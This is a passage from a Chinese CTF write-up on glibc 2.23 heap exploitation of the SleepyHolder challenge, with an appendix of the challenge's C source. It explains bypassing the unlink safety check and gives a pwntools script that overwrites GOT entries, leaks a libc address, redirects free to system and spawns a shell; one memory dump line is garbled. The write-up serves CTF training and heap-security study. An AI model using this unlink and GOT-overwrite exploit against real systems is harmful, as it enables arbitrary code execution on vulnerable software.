设置FD=0x6020d0-0x18 BK=0x6020d0-0x10  
为了绕过检查if (__builtin_expect (FD->bk != P || BK->fd != P, 0))  
FD->bk即FD偏移3x机器位(0x8) BK->fd即BK偏移 2x机器位(0x8)  
所以将FD和BK的位置埋在f_ptr（存放指针P）前的位置就能绕过检查。
检查之后，程序执行Unlink操作
    FD->bk = BK;    (BK=0x6020c0)                              
    BK->fd = FD;    (FD=0x6020b8)
实际上，FD->bk和BK->fd指向同一个地址，那就是全局指针f_ptr的地址。
执行unlink之前
    gef➤  x/10gx 0x6020d0-0x20
    0x6020b0 :    0x00007fe12672e620      0x0000000000000000 :    0x00007f62589b2620    0x0000000000000000
    0x6020c0:    0x000000000072b3e0     0x00007f6258b61010
    0x6020d0:    0x00000000006020b8  Unlink
    #Leak
    got_free=elf.got['free']
    got_puts=elf.got['puts']
    plt_puts=elf.plt['puts']
    got_atoi=elf.got['atoi']
    print "got_puts="+hex(got_puts)
    print "plt_puts="+hex(plt_puts)
    payload=p64(0)+p64(got_puts) #s_ptr->got_puts
    payload+=p64(got_puts)+p64(got_free) #p_ptr->got_free
    payload+=p64(0x1)*3
    Renew(1,payload)
    payload=p64(plt_puts) #free->puts
    Renew(1,payload)
    Free(2) #free(s_ptr)->puts(s_ptr->puts_address)
    puts_address=u64(p.recv(6).ljust(8,"x00"))
    print "[+]puts_address="+hex(puts_address)
    #get shell
    system_offset=0x45390
    puts_offset=0x6f690
    base=puts_address-puts_offset
    system_addr=base+system_offset
    print "[+]system_addr="+hex(system_addr)
    payload=p64(system_addr)
    Renew(1,payload)
    Add(2,"/bin/bash")
    Free(2)
    p.interactive()
###  2.3小结
以上的两个案例都不是使用一种技术就能解决的问题，都是需要多种技术组合才能拿到shell。例如案例一的关键点在于chunk大小的伪造，实现堆溢出导致fastbin_attack,而案例二使用consolidate机制制造double
free，还需要结合unlink才能成功利用。
解题能力最终还要回归到自己对堆机制的理解和对漏洞的感觉。
**笔记**
    Leak地址的方法 1.got表（前提：PIE关闭）2.free_chunk中的FD/BK
    Unlink绕过检查机制，需要利用一个全局指针
## 参考文献：
[0] Glibc-2.23源码
[1] [Anciety](https://me.csdn.net/qq_29343201).0ctf 2017 babyheap writeup.
[https://blog.csdn.net/qq_29343201/article/details/66476135[OL/DB],2017-03-26](https://blog.csdn.net/qq_29343201/article/details/66476135%5BOL/DB%5D,2017-03-26)
[2]华庭(庄明强).《glibc内存管理ptmalloc2源代码分析》2011-4-17
[3]0x9A82.[Hitcon 2016
Pwn赛题学习](https://www.cnblogs.com/Ox9A82/p/6766261.html)
[4]0x2l.堆利用之unlink小结.
附录：
SleeyHolder源码
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define BASE 40
    char *s_ptr;
    char *f_ptr;
    char *q_ptr;
    int s_flag;
    int f_flag;
    int q_flag;
    void add()
    {
    ​    char buf[4];
    ​    char *ptr;
    ​    unsigned int choice;
    ​    puts("What secret do you want to keep?");
    ​    puts("1. Small secret");
    ​    puts("2. Big secret");
    ​    if(!q_flag)
    ​        puts("3. Keep a huge secret and lock it forever");
    ​    memset(buf, 0 ,sizeof(buf));
    ​    read(0, buf, sizeof(buf));
    ​    choice = atoi(buf);
    ​    switch(choice)
    ​    {
    ​        case 1:
    ​            if(f_flag)
    ​                return;
    ​            f_ptr = calloc(1, BASE);
    ​            f_flag = 1;
    ​            puts("Tell me your secret: ");
    ​            read(0, f_ptr, BASE);
    ​            break;
    ​        case 2:
    ​            if(s_flag)
    ​                return;
    ​            s_ptr = calloc(1, BASE*100);
    ​            s_flag = 1;
    ​            puts("Tell me your secret: ");
    ​            read(0, s_ptr, BASE*100);
    ​            break;
    ​        case 3:
    ​            if(q_flag)
    ​                return;
    ​            q_ptr = calloc(1, BASE*10000);
    ​            q_flag = 1;
    ​            puts("Tell me your secret: ");
    ​            read(0, q_ptr, BASE*10000);
    ​            break;
    ​    }
    }
    void del()
    {
    ​    char buf[4];
    ​    int choice;
    ​    puts("Which Secret do you want to wipe?");
    ​    puts("1. Small secret");
    ​    puts("2. Big secret");
    ​    memset(buf, 0, sizeof(buf));
    ​    read(0, buf, sizeof(buf));
    ​    choice = atoi(buf);
    ​    switch(choice)
    ​    {
    ​        case 1:
    ​            free(f_ptr);
    ​            f_flag = 0;
    ​            break;
    ​        case 2:
    ​            free(s_ptr);
    ​            s_flag = 0;
    ​            break;
    ​    }
    }
    void update()
    {
    ​    char buf[4];
    ​    int choice;
    ​    puts("Which Secret do you want to renew?");
    ​    puts("1. Small secret");
    ​    puts("2. Big secret");
    ​    memset(buf, 0, sizeof(buf));
    ​    read(0, buf, sizeof(buf));
    ​    choice = atoi(buf);
    ​    switch(choice)
    ​    {
    ​        case 1:
    ​            if(f_flag)
    ​            {
    ​                puts("Tell me your secret: ");
    ​                read(0, f_ptr, BASE);
    ​            }
    ​            break;
    ​        case 2:
    ​            if(s_flag)
    ​            {
    ​                puts("Tell me your secret: ");
    ​                read(0, s_ptr, BASE*100);
    ​            }
    ​            break;
    ​    }
    }
    void handler(){
    ​    puts("Timeout!");
    ​    exit(1);
    }
    void init_prog(){
    ​    setvbuf(stdout, 0,2,0);
    ​    signal(SIGALRM, handler);
    ​    alarm(60);
    }
    int main()
    {
    ​    init_prog();
    ​    puts("Waking Sleepy Holder up ...");
    ​    int fd = open("/dev/urandom", O_RDONLY);
    ​    unsigned int rand_size;
    ​    read(fd, &rand_size, sizeof(rand_size));
    ​    rand_size %= 4096;
    ​    malloc(rand_size);
    ​    sleep(3);
    ​    char buf[4];
    ​    unsigned int choice;
    ​    puts("Hey! Do you have any secret?");
    ​    puts("I can help you to hold your secrets, and no one will be able to see it :)");
    ​    while(1){
    ​        puts("1. Keep secret");
    ​        puts("2. Wipe secret");
    ​        puts("3. Renew secret");
    ​        memset(buf, 0 ,sizeof(buf));
    ​        read(0, buf, sizeof(buf));
    ​        choice = atoi(buf);
    ​        switch(choice){
    ​            case 1:
    ​                add();          
    ​                break;
    ​            case 2:
    ​                del();
    ​                break;
    ​            case 3:
    ​                update();
    ​                break;
    ​        }
    ​    }
    }